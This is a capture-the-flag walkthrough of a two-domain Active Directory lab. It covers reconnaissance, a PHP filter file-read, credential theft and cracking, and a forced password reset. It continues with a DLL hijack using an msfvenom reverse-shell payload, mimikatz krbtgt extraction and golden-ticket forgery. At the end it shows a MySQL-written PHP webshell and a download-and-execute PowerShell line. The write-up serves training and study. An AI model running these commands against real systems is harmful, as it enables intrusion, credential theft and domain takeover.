# Trusted
![](images/trusted.png)


IPs: `10.10.217.117` `10.10.217.118`

# Recon
Nmap:
10.10.217.117 trusteddc.trusted.vl
```
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:29Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

10.10.217.118 labdc.lab.trusted.vl
```
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:18Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3306/tcp open  mysql         syn-ack ttl 127 MariaDB 5.5.5-10.4.24
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Seems to be a parent and child domain which will be interesting.

Checking port 80 shows that xampp `XAMPP for Windows 8.1.6` is running, this has a webdav exploit https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit but the endpoint doesn't seem to exist. 

Fuzzing with `ffuf` shows a `/dev` endpoint:
```
ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.217.118/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.217.118/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

...snip...
dev                     [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 283ms]
```

# Foothold
On the main page there is a note:
```
Eric please take a look at this if you have the time. I tried to implement some php code and set up the database connection but it doesn't seem to work. Could you fix it please?
```

The URI path for the website also looks very interesting:
```
https://10.10.217.118/dev/index.html?view=index.html
```

Using this we are able to read arb files:
```
https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\Windows\System32\drivers\etc\hosts

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
```

Fuzzing again shows a file called `db.php`
```
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u 'https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php' -fw 55

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 55
________________________________________________

db                      [Status: 200, Size: 1109, Words: 25, Lines: 31, Duration: 286ms]
```

Which has db creds:
```
<?php 
$servername = "localhost";
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";

$conn = mysqli_connect($servername, $username, $password);

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
```

Logging into the db gives creds!
```
+--------------+----------------------------------+
| short_handle | password                         |
+--------------+----------------------------------+
| rsmith       | 7e7abb54bbef42f0fbfa3007b368def7 |
| ewalters     | d6e81aeb4df9325b502a02f11043e0ad |
| cpowers      | e3d3eb0f46fe5d75eed8d11d54045a60 |
+--------------+----------------------------------+
```

Throwing these in hashcat gives:
```
rsmith:IHateEric2
```

# Lateral movement to ewalters
Looking at shares, there isnt anything interesting we can read, so going to run bloodhound.

Bloodhound shows that our user can forcechange the password of ewalters. So lets do that.

```
rpcclient -U 'rsmith' //labdc.lab.trusted.vl
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\rsmith]:
rpcclient $> setuserinfo2 ewalters 23 SecurePassword123@

```

Then checking that it is set.
```
nxc winrm labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
WINRM       10.10.217.118   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
WINRM       10.10.217.118   5985   LABDC            [+] lab.trusted.vl\ewalters:SecurePassword123@ (Pwn3d!)
```

Nice! We can also login with winrm

```
evil-winrm -i labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ewalters\Documents> 
```

# DLL Hijack to DA
Looking around there is an AVTest directory with two files:
`kasperskyremovaltool.exe` and `readme.txt`

The note mentions another user is expected to run this program:
```
Since none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.
I asked Christine to run them a few times, just to be sure.

Let's just hope we don't have to set this lab up again because of this.
```

A potential privesc would be to see if we can dll hijack this application and get a reverse shell as the user running the application which should be an admin as AVTools love there high privs. :)

To check for this you can load up procmon and check for missing imports, there are heaps of resources on how to do this.

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

Do this you will see that the application tries to load `KasperskyRemovalToolENU.dll` a few times. 
So if we make a dll and call it `KasperskyRemovalToolENU.dll` and place it in the same location as the `kasperskyremovaltool.exe` we will get a shell.

Being lazy and using msfvenom:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.110 LPORT=9001 -f dll -o KasperskyRemovalToolENU.dll
```

Uploading the file and waiting a bit we get a shell as `cpowers` that happens to be a domain admin on the machine.
```
whoami /groups

GROUP INFORMATION
-----------------
... snip ...
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
LAB\Domain Admins                          Group            S-1-5-21-2241985869-2159962460-1278545866-512 Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

# Forest Privesc

Going back to bloodhound shows that there is a parent domain called `trusted.vl` to priv esc into this domain and get enterprise admin we can grab the krbtgt hash for `lab.trusted.vl` and forge a golden ticket.
To get this we can just do a dcsync on the dc with mimikatz.
```
.\mimikatz.exe "privilege::debug" "lsadump::lsa /user:krbtgt /patch" "exit"
..snip..
User : krbtgt
LM   : 
NTLM : c7a03c565c68c6fac5f8913fab576ebd
```

We also need the domain sid of both domains, both available from bloodhound.
```
lab.trusted.vl S-1-5-21-2241985869-2159962460-1278545866
trusted.vl S-1-5-21-3576695518-347000760-3731839591
```

We can use the default Enterprise Admin groups SID being <domain_sid>-519

Now to form the ticket:
```
ticketer.py -nthash c7a03c565c68c6fac5f8913fab576ebd -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator
```

Then login with psexec:
```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
trusteddc
```

:D !

# Beyond Root
Fun box, good opportunity for a reminder on how to go from a child domain to parent domain. There is an easy way to cheese half this lab tho. 

You can write a file to the webroot in mysql and skip the lateral movement and privesc on the first box. You can do this as by default mysql will allow you to write a file to disk.
```
select '<?php system($_REQUEST["cmd"]); ?>' into outfile "C:\\xampp\\htdocs\\dev\\webshell.php";
```

Then you can just `iex(iwr http://server/file.ps1)` to get a revshell.
